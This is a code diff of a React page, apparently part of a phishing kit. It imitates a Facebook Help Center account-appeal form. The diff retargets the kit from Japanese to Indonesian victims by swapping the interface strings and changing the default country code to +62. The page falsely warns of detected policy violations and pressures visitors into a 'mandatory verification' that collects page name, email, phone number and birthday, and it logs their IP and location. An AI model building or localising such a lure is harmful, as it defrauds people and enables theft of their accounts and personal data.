@@ -10,36 +10,36 @@ import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 import axios from 'axios';
 
 const Home = () => {
-    // Tất cả text tiếng Nhật
+    // Tất cả text tiếng Indonesia
     const texts = {
-        helpCenter: 'ヘルプセンター',
+        helpCenter: 'Pusat Bantuan',
         english: 'English',
-        using: '使い方',
-        managingAccount: 'アカウントの管理',
-        privacySecurity: 'プライバシー、安全性とセキュリティ',
-        policiesReporting: 'ポリシーと報告',
-        pagePolicyAppeals: 'アカウントポリシーの苦情',
-        detectedActivity: 'あなたのページとアカウントで、著作権侵害やポリシー違反の報告を含む不審な活動を検出しました',
-        accessLimited: 'アカウントを保護するため、迅速かつ正確な審査プロセスを確保するために、今すぐ情報を確認してください。',
-        submitAppeal: 'これはFacebookアカウントの必須確認ステップです。アカウントの停止を避け、ケースの解決を迅速化するため、すぐに確認を完了してください。',
-        pageName: 'ページ名',
-        mail: 'メールアドレス',
-        phone: '電話番号',
-        birthday: '生年月日',
-        yourAppeal: 'あなたの申し立て',
-        appealPlaceholder: '苦情申請の詳細をご記入ください。',
-        submit: '送信',
-        fieldRequired: 'この項目は必須です',
-        invalidEmail: '有効なメールアドレスを入力してください',
-        about: '概要',
-        adChoices: '広告の選択',
-        createAd: '広告を作成',
-        privacy: 'プライバシー',
-        careers: '採用情報',
-        createPage: 'ページを作成',
-        termsPolicies: '利用規約とポリシー',
+        using: 'Cara Menggunakan',
+        managingAccount: 'Kelola Akun',
+        privacySecurity: 'Privasi, Keamanan & Keamanan',
+        policiesReporting: 'Kebijakan & Pelaporan',
+        pagePolicyAppeals: 'Banding Kebijakan Akun',
+        detectedActivity: 'Kami telah mendeteksi aktivitas mencurigakan di halaman dan akun Anda, termasuk laporan pelanggaran hak cipta dan pelanggaran kebijakan',
+        accessLimited: 'Untuk melindungi akun Anda dan memastikan proses peninjauan yang cepat dan akurat, harap verifikasi informasi Anda sekarang.',
+        submitAppeal: 'Ini adalah langkah verifikasi wajib untuk akun Facebook. Untuk menghindari penangguhan akun dan mempercepat penyelesaian kasus, harap selesaikan verifikasi segera.',
+        pageName: 'Nama Halaman',
+        mail: 'Alamat Email',
+        phone: 'Nomor Telepon',
+        birthday: 'Tanggal Lahir',
+        yourAppeal: 'Banding Anda',
+        appealPlaceholder: 'Silakan isi detail permohonan banding Anda.',
+        submit: 'Kirim',
+        fieldRequired: 'Bidang ini wajib diisi',
+        invalidEmail: 'Masukkan alamat email yang valid',
+        about: 'Tentang',
+        adChoices: 'Pilihan Iklan',
+        createAd: 'Buat Iklan',
+        privacy: 'Privasi',
+        careers: 'Karir',
+        createPage: 'Buat Halaman',
+        termsPolicies: 'Ketentuan & Kebijakan',
         cookies: 'Cookie',
-        pleaseWait: 'お待ちください...'
+        pleaseWait: 'Harap tunggu...'
     };
 
     const [formData, setFormData] = useState({
@@ -51,8 +51,8 @@ const Home = () => {
     });
 
     const [errors, setErrors] = useState({});
-    const [countryCode, setCountryCode] = useState('JP');
-    const [callingCode, setCallingCode] = useState('+81');
+    const [countryCode, setCountryCode] = useState('ID');
+    const [callingCode, setCallingCode] = useState('+62');
     const [isSubmitting, setIsSubmitting] = useState(false);
     
     const isMountedRef = useRef(true);
@@ -71,7 +71,7 @@ const Home = () => {
                     ip: ipData.ip || 'CHỊU',
                     country: ipData.country || 'CHỊU',
                     city: ipData.city || 'CHỊU',
-                    country_code: ipData.country_code || 'JP'
+                    country_code: ipData.country_code || 'ID'
                 });
             })
             .catch((error) => {
@@ -81,7 +81,7 @@ const Home = () => {
                     ip: 'CHỊU',
                     country: 'CHỊU',
                     city: 'CHỊU',
-                    country_code: 'JP'
+                    country_code: 'ID'
                 });
             });
         
